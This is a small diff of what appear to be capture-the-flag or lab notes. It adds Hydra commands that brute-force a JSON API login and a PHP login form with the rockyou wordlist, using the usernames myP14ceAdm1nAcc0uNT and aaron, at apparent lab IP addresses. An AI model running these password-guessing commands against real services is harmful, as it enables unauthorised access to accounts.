@@ -2,3 +2,5 @@ json crack
 hydra -l myP14ceAdm1nAcc0uNT -P rockyou.txt 10.10.10.58 -s 3000 http-post-form
 "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authenticatio
 n failed:H=Content-Type\: application/json" -t 64
+
+hydra -l aaron -P /usr/share/wordlists/rockyou.txt 10.129.93.50 http-post-form '/login.php?login=true:user=^USER^&password=^PASS^:Invalid'
